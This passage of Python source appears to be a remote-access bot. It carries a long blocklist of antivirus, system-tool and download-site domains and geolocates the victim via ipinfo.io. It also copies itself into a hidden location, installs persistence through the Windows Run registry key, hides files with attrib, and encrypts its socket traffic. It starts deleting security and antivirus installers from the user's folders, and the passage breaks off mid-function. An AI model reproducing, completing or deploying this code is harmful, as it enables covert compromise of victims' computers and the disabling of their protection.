'aida64russia.com', 'www.aida64.ru', 'aida64.com.ua', 'aida64.download-windows.org', 'aida64-extreme.en.uptodown.com', 'aida64-extreme.ru.uptodown.com', 'aida64.ru.malavida.com', 'aida64-extreme-edition.en.softonic.com', 'aida64-extreme-edition.softonic.ru', 'aida64.updatestar.com', 'aida64-engineer.updatestar.com', 'aida64-extreme.software.informer.com', 'aida64-engineer.software.informer.com', 'aida64-business-edition.software.informer.com', 'aida64-network-audit.software.informer.com', 'aida64-extreme-edition-it.download.it', 'processhacker.sourceforge.io', 'process-hacker.ru.malavida.com', 'process-hacker.en.softonic.com', 'process-hacker.softonic.ru', 'process-hacker.updatestar.com', 'process-hacker.informer.com', 'strlen.com', 'www.ccleaner.com', 'ccleaner.download-windows.org', 'ccleaner.en.uptodown.com', 'ccleaner.ru.uptodown.com', 'ccleaner.ru.malavida.com', 'ccleaner.en.softonic.com', 'ccleaner.softonic.ru', 'ccleaner-professional.en.softonic.com', 'ccleaner-professional.softonic.ru', 'ccleaner-professional.updatestar.com', 'ccleaner-portable.updatestar.com', 'ccleaner.software.informer.com', 'ccleaner-professional.software.informer.com', 'ccleaner.download.it', 'ccleaner-portable.download.it', 'ccleaner-professional.download.it', 'ccleaner-slim.download.it', 'www.revouninstaller.com', 'revo_uninstaller.download-windows.org', 'revo-uninstaller.en.uptodown.com', 'revo-uninstaller.ru.uptodown.com', 'revo-uninstaller-portable.en.uptodown.com', 'revo-uninstaller-portable.ru.uptodown.com', 'revo-uninstaller.ru.malavida.com', 'revo-uninstaller.en.softonic.com', 'revo-uninstaller.softonic.ru', 'revo-uninstaller.informer.com', 'revo-uninstaller-pro.software.informer.com', 'www.martau.com', 'win10tweaker.ru', 'ultimate-windows-tweaker.en.uptodown.com', 'ultimate-windows-tweaker.ru.uptodown.com', 'true-system-security-tweaker.ru.malavida.com', 'win-10-tweaker.software.informer.com', 'www.farmanager.com', 'www.ghisler.com', 'total-commander.en.uptodown.com', 'total-commander.ru.uptodown.com', 'total-commander.ru.malavida.com', 'total-commander.en.softonic.com', 'total-commander.softonic.ru', 'christian-ghisler-total-commander.updatestar.com', 'ghisler-total-commander.updatestar.com', 'total-commander.software.informer.com', 'total-commander-powerpack.software.informer.com', 'windows-commander.software.informer.com', 'total-commander-7.download.it', 'total-commander.download.it', 'www.wireshark.org', 'wireshark.en.uptodown.com', 'wireshark.ru.uptodown.com', 'wireshark.ru.malavida.com', 'wireshark.en.softonic.com', 'wireshark.softonic.ru', 'wireshark-1.en.softonic.com', 'wireshark-1.softonic.ru', 'wireshark.updatestar.com', 'wireshark.software.informer.com', 'wireshark.download.it', 'wireshark-1.download.it', 'cmder.app', 'cmder.en.softonic.com', 'cmder.softonic.ru', 'cmder.updatestar.com', 'cmder.download.it', 'winaerotweaker.com', 'winaero.com', 'winaero-tweaker.en.uptodown.com', 'winaero-tweaker.ru.uptodown.com', 'winaero-tweaker.en.softonic.com', 'winaero-tweaker.softonic.ru', 'winaero-tweaker.updatestar.com', 'winaerotweaker.software.informer.com', 'winaero-tweaker.download.it', 'privazer.com', 'privazer.en.uptodown.com', 'privazer.ru.uptodown.com', 'privazer.en.softonic.com', 'privazer.softonic.ru', 'privazer-portable.en.softonic.com', 'privazer-portable.softonic.ru', 'privazer.updatestar.com', 'privazer.software.informer.com', 'privazer.download.it', 'cleanmgr.en.softonic.com', 'cleanmgr.softonic.ru', 'pcmanager.microsoft.com', 'microsoft-pc-manager.en.uptodown.com', 'microsoft-pc-manager.ru.uptodown.com', 'microsoft-pc-manager.en.softonic.com', 'microsoft-pc-manager.softonic.ru', 'microsoft-pc-manager.updatestar.com', 'www.wisecleaner.com', 'ru.wisecleaner.com', 'wise-care-365-pro.download-windows.org', 'wise-care-365.en.uptodown.com', 'wise-care-365.ru.uptodown.com', 'wise-disk-cleaner.en.uptodown.com', 'wise-disk-cleaner.ru.uptodown.com', 'wise-disk-cleaner-portable.en.uptodown.com', 'wise-disk-cleaner-portable.ru.uptodown.com', 'wise-registry-cleaner.en.uptodown.com', 'wise-registry-cleaner.ru.uptodown.com', 'wise-care-365.ru.malavida.com', 'wise-disk-cleaner.ru.malavida.com', 'wise-registry-cleaner.ru.malavida.com', 'wise-memory-optimizer.ru.malavida.com', 'wise-care-365.en.softonic.com', 'wise-care-365.softonic.ru', 'wisecleaner-checkit.en.softonic.com', 'wisecleaner-checkit.softonic.ru', 'wise-disk-cleaner.en.softonic.com', 'wise-disk-cleaner.softonic.ru', 'wise-system-monitor.en.softonic.com', 'wise-system-monitor.softonic.ru', 'wise-care-365-free.updatestar.com', 'wise-disk-cleaner-free.updatestar.com', 'wise-registry-cleaner.updatestar.com', 'wise-care-365.informer.com', 'wise-disk-cleaner-free.software.informer.com', 'wise-memory-optimizer.software.informer.com', 'wise-registry-cleaner.software.informer.com', 'wise-game-booster.software.informer.com', 'wise-disk-cleaner.download.it', 'wise-registry-cleaner.download.it', 'wise-registry-cleaner-portable.download.it', 'wise-game-booster.download.it', 'easycleaner.en.softonic.com', 'easycleaner.softonic.ru', 'clean-master.en.softonic.com', 'clean-master.softonic.ru', 'www.cleanmasterofficial.com', 'www.auslogics.com', 'auslogics-boostspeed.download-windows.org', 'auslogics-boostspeed.en.uptodown.com', 'auslogics-boostspeed.ru.uptodown.com', 'auslogics-disk-defrag.en.uptodown.com', 'auslogics-disk-defrag.ru.uptodown.com', 'auslogics-disk-defrag.ru.malavida.com', 'auslogics-duplicate-file-finder.ru.malavida.com', 'auslogics-boostspeed.en.softonic.com', 'auslogics-boostspeed.softonic.ru', 'auslogicsdriverupdater.en.softonic.com', 'auslogicsdriverupdater.softonic.ru', 'auslogics-disk-defrag.en.softonic.com', 'auslogics-disk-defrag.softonic.ru', 'auslogics-registry-cleaner.en.softonic.com', 'auslogics-registry-cleaner.softonic.ru', 'auslogics-disk-defrag-portable.en.softonic.com', 'auslogics-disk-defrag-portable.softonic.ru', 'auslogics-registry-defrag.en.softonic.com', 'auslogics-registry-defrag.softonic.ru', 'auslogics-boostspeed.updatestar.com', 'auslogics-antivirus.updatestar.com', 'auslogics-boostspeed.informer.com', 'auslogics-disk-defrag.software.informer.com', 'auslogics-duplicate-file-finder.software.informer.com', 'auslogics-registry-defrag.software.informer.com', 'auslogics-boostspeed.download.it', 'auslogics-disk-defrag.download.it', 'www.bleachbit.org', 'bleachbit.en.uptodown.com', 'bleachbit.ru.uptodown.com', 'bleachbit.ru.malavida.com', 'bleachbit.en.softonic.com', 'bleachbit.softonic.ru', 'bleachbit-portable.softonic.com', 'bleachbit.updatestar.com', 'bleachbit.informer.com', 'bleachbit.download.it', 'www.ashampoo.com', 'ashampoo-burning-studio.download-windows.org', 'ashampoo-burning-studio.en.uptodown.com', 'ashampoo-burning-studio.ru.uptodown.com', 'ashampoo-burning-studio.ru.malavida.com', 'ashampoo-winoptimizer.ru.malavida.com', 'ashampoo-burning-studio.en.softonic.com', 'ashampoo-burning-studio.softonic.ru', 'ashampoo-winoptimizer.en.softonic.com', 'ashampoo-winoptimizer.softonic.ru', 'ashampoo-app.updatestar.com', 'ashampoo-winoptimizer-free-v-1-0-0.updatestar.com', 'ashampoo-burning-studio.software.informer.com', 'ashampoo-winoptimizer.software.informer.com', 'ashampoo-winoptimizer.download.it', 'ashampoo-firewall.download.it', 'www.systweak.com', 'systweak-software-updater.updatestar.com', 'fast-computer.su', 'www.kerish.org', 'kerish-doctor.download-windows.org', 'kerish-doctor-2007.en.uptodown.com', 'kerish-doctor-2007.ru.uptodown.com', 'kerish-doctor-2014.updatestar.com', 'kerish-doctor-2016.updatestar.com', 'kerish-doctor-2008.software.informer.com', 'kerish-doctor-2017.software.informer.com', 'kerish-doctor-2015.software.informer.com', 'kerish-doctor-2016.software.informer.com', 'kerish-doctor-2018.software.informer.com', 'macpaw.com', 'cleanmypc.ru.malavida.com', 'cleanmymac.updatestar.com', 'cleanmypc.download.it', 'www.bcuninstaller.com', 'advanced-spyware-remover.en.softonic.com', 'advanced-spyware-remover.softonic.ru', 'www.iobit.com', 'ru.iobit.com', 'iobit-malware-fighter.download-windows.org', 'iobit-unistaller.en.uptodown.com', 'iobit-unistaller.ru.uptodown.com', 'iobit-uninstaller.ru.malavida.com', 'iobit-software-updater.ru.malavida.com', 'iobit-uninstaller.en.softonic.com', 'iobit-uninstaller.softonic.ru', 'iobit-advanced-systemcare.en.softonic.com', 'iobit-advanced-systemcare.softonic.ru', 'iobit-software-updater.en.softonic.com', 'iobit-software-updater.softonic.ru', 'iobit-malware-fighter.en.softonic.com', 'iobit-malware-fighter.softonic.ru', 'obit-driver-booster.updatestar.com', 'iobit-uninstaller-portable.updatestar.com', 'iobit-uninstaller.software.informer.com', 'iobit-malware-fighter.software.informer.com', 'iobit-software-updater.software.informer.com', 'iobit-uninstaller.download.it', 'iobit-malware-fighter.download.it', 'iobit-software-updater.download.it', 'www.oo-software.com', 'oo-software.com', 'o-o-shutup.updatestar.com', 'oando-shutup10plusplus.en.uptodown.com', 'oando-shutup10plusplus.ru.uptodown.com', 'shutup10.en.softonic.com', 'shutup10.softonic.ru', 'shutup10.software.informer.com', 'oo-shutup.download.it', 'www.glarysoft.com', 'glary-utilities.download-windows.org', 'glary-utilities.en.uptodown.com', 'glary-utilities.ru.uptodown.com', 'malware-hunter.en.uptodown.com', 'malware-hunter.ru.uptodown.com', 'glary-utilities.ru.malavida.com', 'glary-undelete.ru.malavida.com', 'glary-utilities.en.softonic.com', 'glary-utilities.softonic.ru', 'glarysoft-quick-search.en.softonic.com', 'glarysoft-quick-search.softonic.ru', 'glarysoft-malware-hunter.en.softonic.com', 'glarysoft-malware-hunter.softonic.ru', 'glary-utilities-portable.en.softonic.com', 'glary-utilities-portable.softonic.ru', 'glarysoft-toolbar.updatestar.com', 'glary-utilities.software.informer.com', 'glary-utilities-pro.informer.com', 'malware-hunter.software.informer.com', 'www.enigmasoftware.com', 'www.spyhunter.com', 'spyhunter.ru.malavida.com', 'dism.softonic.ru', 'dismplusplus.en.uptodown.com', 'dismplusplus.ru.uptodown.com', 'dism.en.softonic.com', 'dism.updatestar.com', 'dism.download.it', 'adwcleaner.download-windows.org', 'adwcleaner.en.uptodown.com', 'adwcleaner.ru.uptodown.com', 'adwcleaner.updatestar.com', 'adwcleaner.ru.malavida.com', 'bps-spyware-adware-remover.en.uptodown.com', 'bps-spyware-adware-remover.ru.uptodown.com', 'spyware-and-adware-remover.ru.malavida.com', 'ad-purge-adware-and-spyware-remover.en.softonic.com', 'ad-purge-adware-and-spyware-remover.softonic.ru', 'telamoncleaner.com', 'telamon-cleaner.updatestar.com', 'telamon-cleaner.software.informer.com', 'www.zabbix.com', 'zabbix-agent.updatestar.com', 'zabbix-agent.software.informer.com', 'winupdatefixer.com', 'windows-update-fixer.en.uptodown.com', 'windows-update-fixer.ru.uptodown.com', 'windows-update-fixer.en.softonic.com', 'windows-update-fixer.softonic.ru', 'windows-update-fixer.updatestar.com', 'github.com', 'gitlab.com', 'sourceforge.net', 'download-windows.org', 'www.softportal.com', 'www.uptodown.com', 'uptodown.com', 'en.uptodown.com', 'ru.uptodown.com', 'trashbox.ru', 'pdalife.to', 'www.malavida.com', 'ru.malavida.com', 'www.softonic.com', 'en.softonic.com', 'www.softonic.ru', 'rsload.net', '5mod.ru', 'pcprogs.net', 'toolslib.net', 'www.softpedia.com', 'www.exploit-db.com', 'www.rapid7.com', 'itorrents-igruha.org', 'www.trustpilot.com', 'antikeys.org', 'softico.ua', 'm.majorgeeks.com', 'www.softkey.ua', 'www.comss.ru', 'softlist.com.ua', 'allsoft.ua', 'mediaget.com', 'uztor.org', 'installpack.net', 'xetcom.net', 'softok.info', 'www.besplatnyeprogrammy.ru', 'relizua.com', 'taiwebs.com', 'en.taiwebs.com', 'ru.taiwebs.com', 'pesktop.com', 'soft.mydiv.net', 'softportal.su', 'www.softsalad.ru', 'apocalypse.moy.su', 'itpro.ua', 'most-it.com.ua', 'install.download', 'ukrzvit.ua', 'softonline.com.ua', 'bakotech.com', 'asia.bakotech.com', 'clean-master-for-pc.download.it', 'bakotech.ru', 'bakotech.ua', 'hotline.ua', '1progs.ru', 'kichkas.biz', 'vipmolik.net', 'iceprogs.ru', 'appforwin.ru', 'litl-admin.ru', 'programmy.info', 'addons.thunderbird.net', 'www.06277.com.ua', 'smadav-antivirus-2017.ru.malavida.com', 'www.mssoft.ru', 'biblprog.org.ua', 'z-oleg.com', 'www.safezone.cc', 'winsoft.com.ua', 'mysoft.com.ua', 'androeed.ru', 'androeed.store', 'rutracker.org', 'nnmclub.to', 'sc.lvivservice.com.ua', 'spec-komp.com', 'pc-tools-antivirus-free.en.softonic.com', 'pc-tools-antivirus-free.softonic.ru', '4pda.to', 'lansys.com.ua', 'www.mti.ua', 'products.mti.ua', 'www.wincore.ru', 'www.sald.ru', 'www.slo.ru', 'lite.bz', 'www.findmysoft.com', 'ru.vessoft.com', 'uk.vessoft.com', '4creates.com', 'www.daad.org.ua', 'jv16powertools.com', 'daad.org.ua', 'www.softmart.ua', 'lrepacks.net', 'www.oszone.net', 'soft.oszone.net', 'stoigr.org', 'www.onworks.net', 'www.syssoft.ru', 'tunecom.ru', 'my-pc.com.ua', 'www.gameloop.com', 'soft.sibnet.ru', 'www.versiya.com', 'zoomexe.net', 'apkpure.com', 'apkpure.net', 'download.it', 'en.download.it', 'ru.download.it', 'soft.softodrom.ru', 'oneprogs.ru', 'apps24.org', 'www.securitystronghold.com', 'antivirus.org.ua', 'www.freedownloadmanager.org', 'en.freedownloadmanager.org', 'ru.freedownloadmanager.org', 'skachat.freedownloadmanager.org', 'softorage.com', 'software.com.ua', 'forum.bigfix.com', 'www.broadcom.com', 'www.antivirusguide.com', 'freesoft.net', 'freesoft.ru', 'cybersoft.ru', '1soft.space', 'sg.hu', 'total-commander.download-windows.org', 'moiprogrammy.com', 'moiprogrammy.net', 'links.i.ua', '2kom.ru', 'brain.com.ua', 'www.npackd.org', 'antivirus.by', 'genesisua.com', 's-l-o.sourceforge.io', 'freeexe.net', 'www.techspot.com', 'lumpics.ru', 'soft-windows.org', 'www.downloadcrew.com', 'www.bleepingcomputer.com', 'programy.com.ua', 'ofitsialnaya-versiya.org', 'www.informer.com', 'software.informer.com', 'www.updatestar.com', 'bitdefender.in.ua', 'softmany.com', 'mtsoft.kiev.ua', 'edt.in.ua', 'eset-endpoint.com.ua', 'slashdot.org', 'www.dz-techs.com', 'ru.dz-techs.com', 'esetofficial.tm', 'soft-landia.ru', 'spvcomp.com', 'softcatalog.io', 'ccleaner.org.ua', 'wikiprograms.org']
    
    URL_IPCONFIG = 'https://ipinfo.io/json'
    URL_IPCONFIG_KEYS = {
        'ip': 'ip',
        'isp': 'org',
        'country': 'country',
        'region': 'region',
        'city': 'city',
        'latitude': '',
        'longitude': '',
        'coordinate': 'loc'
    }
    
    HEADERS = choice([{'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:50.0.1) Gecko/20100101 Firefox/50.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.7.4) Gecko/20100101 Firefox/52.7.4'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:58.0.2) Gecko/20100101 Firefox/58.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36 OPR/55.0.2994.61'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0.2) Gecko/20100101 Firefox/56.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; rv:57.0.3) Gecko/20100101 Firefox/57.0.3'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2; rv:52.8.1) Gecko/20100101 Firefox/52.8.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6; rv:60.2.2) Gecko/20100101 Firefox/60.2.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36 OPR/54.0.2952.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36 OPR/52.0.2871.99'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Safari/537.36 OPR/50.0.2762.67'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 OPR/55.0.2994.37'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626 Safari/537.36 OPR/56.0.3051.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36 OPR/55.0.2994.47'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0.3) Gecko/20100101 Firefox/66.0.3'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1; rv:52.5.2) Gecko/20100101 Firefox/52.5.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.1.1) Gecko/20100101 Firefox/52.1.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:58.0.2) Gecko/20100101 Firefox/58.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:57.0.2) Gecko/20100101 Firefox/57.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2; rv:52.1.0) Gecko/20100101 Firefox/52.1.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1; rv:66.0.5) Gecko/20100101 Firefox/66.0.5'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6; rv:62.0.2) Gecko/20100101 Firefox/62.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.3.0) Gecko/20100101 Firefox/60.3.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/52.0.2871.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809 Safari/537.36 OPR/58.0.3135.107'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36 OPR/54.0.2952.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0.1) Gecko/20100101 Firefox/51.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1; rv:52.8.1) Gecko/20100101 Firefox/52.8.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:50.0.2) Gecko/20100101 Firefox/50.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0 Safari/537.36 OPR/58.0.3135.127'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:65.0.1) Gecko/20100101 Firefox/65.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/52.0.2871.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.5.2) Gecko/20100101 Firefox/60.5.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/56.0.3051.52'}])
    
    antivirus_and_tools_directories = [
        list(walk(rf'C:\Users\{getlogin()}\Favorites')), 
        list(walk(rf'C:\Users\{getlogin()}\Desktop')), 
        list(walk(rf'C:\Users\{getlogin()}\Downloads')), 
        list(walk(rf'C:\Users\{getlogin()}\Documents')), 
        list(walk(rf'C:\Users\{getlogin()}\Pictures')), 
        list(walk(rf'C:\Users\{getlogin()}\Videos')), 
        list(walk(rf'C:\Users\{getlogin()}\Music')), 
        list(walk(rf'C:\Users\{getlogin()}\Links')), 
        list(walk(rf'C:\Users\{getlogin()}\OneDrive'))
    ]

    BOT_NAME = split_path(__file__)[-1].replace('.py', '.exe')
    BOT_NAME_REG = BOT_NAME[:BOT_NAME.rindex('.')]
    BOT_PATH = f'{PATH}\\{BOT_NAME}'

    RUN_KEY = r'Software\Microsoft\Windows\CurrentVersion\Run'
    SA_KEY = r'Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'

    pygui.FAILSAFE = False
    
    setup()


def setup():
    try:
        if not exists(PATH):
            mkdir(PATH)
    except: ...

    try:
        if not exists(BOT_PATH):
            move_path(BOT_NAME, BOT_PATH)
    except: ...

    try: 
        regedit(RUN_KEY, None, None, None, 0, current_user=True)
    except: ...

    try: 
        regedit(RUN_KEY, BOT_NAME_REG, BOT_PATH, 1, 1, current_user=True)
    except: ...


def generator_symbols():
    symbols = ''

    for _ in range(int(KEY_LENGTH)):
        symbols += choice(KEY_SYMBOLS)

    return symbols


def encrypt_string(string):
    global session_symbols, PATTERN_SYMBOLS
    
    string = str(string)
    result = ''

    for n in string:
        if not n in session_symbols:
            PATTERN_SYMBOLS.append(n)
            session_symbols[n] = generator_symbols()

        if n in session_symbols:
            result += KEY_PATTERN_MAIN + session_symbols[n]
        else:
            result += KEY_PATTERN_ANOTHER + session_symbols[n]
    
    return result


def decrypt_string(string):
    string = str(string)
    result = ''

    for n in string.split(KEY_PATTERN_MAIN):
        symbol, *another_symbol = n.split(KEY_PATTERN_ANOTHER)

        for sym in session_symbols.items():
            if sym[-1] == symbol:
                result += sym[0]
                break

        if another_symbol:
            result += ''.join(another_symbol)

    return result


def send_msg(_socket, string):
    if type(string) is bytes:
        string = string.decode()

    data = encrypt_string(string).encode()
    _socket.sendall(data)


def receive_msg(_socket, flag=False):
    try:
        data = _socket.recv(1_000_000_000)
    except:
        data = _socket.recv(1_000_000)

    if flag:
        return data
    else:
        return decrypt_string(data.decode())


def get_date(): 
    try: 
        return datetime.now().strftime('%H:%M %d.%m.%Y').split() 
    except: 
        return ['NOT FOUND', 'NOT FOUND']
    

def cmd(result):
    if type(result) is bytes:
        try: 
            return result.decode(detect(result)['encoding'])
        except: 
            return result.decode('cp866') 
        

def get_bot_path_directory():
    try:
        if not exists(r'C:\Windows\Temp'): 
            mkdir(r'C:\Windows\Temp')
    except: ...

    try:
        with open(r'C:\Windows\Temp\G4V7-N3M8-D6C0-4F4H-A9B1-263C-943F-64EE', 'r') as path_onefile_bot_file: 
            if 'onefile' in (path_onefile_bot := decrypt_string(path_onefile_bot_file.read())): 
                delete_directory(path_onefile_bot)
    except: ...

    try:
        with open(r'C:\Windows\Temp\G4V7-N3M8-D6C0-4F4H-A9B1-263C-943F-64EE', 'w') as path_onefile_bot_file: 
            path_onefile_bot_file.write(encrypt_string('\\'.join(__file__.split('\\')[:-1])))

        run(r'attrib +h +s +r C:\Windows\Temp\G4V7-N3M8-D6C0-4F4H-A9B1-263C-943F-64EE'.split(), 
            stdout=DEVNULL, stderr=DEVNULL, shell=True)
    except: ...


def delete_setup_antiviruses_and_tools(directory):
    for folder_path in [_folder_path[0] for _folder_path in directory]: 
        for setup_antivirus_path_and_tool_path in (glob(folder_path + '\\*')):
            try: 
                name_setup_antivirus_and_tool = setup_antivirus_path_and_tool_path.split('\\')[-1].lower()
                if (
                    'antivirus' in name_setup_antivirus_and_tool
                    ) or ('anti' in name_setup_antivirus_and_tool and 'virus' in name_setup_antivirus_and_tool
                    ) or ('virus' in name_setup_antivirus_and_tool
                    ) or ('anti' in name_setup_antivirus_and_tool and 'malware' in name_setup_antivirus_and_tool
                    ) or ('malware' in name_setup_antivirus_and_tool
                    ) or ('spyware' in name_setup_antivirus_and_tool
                    ) or ('security' in name_setup_antivirus_and_tool
                    ) or ('secure' in name_setup_antivirus_and_tool
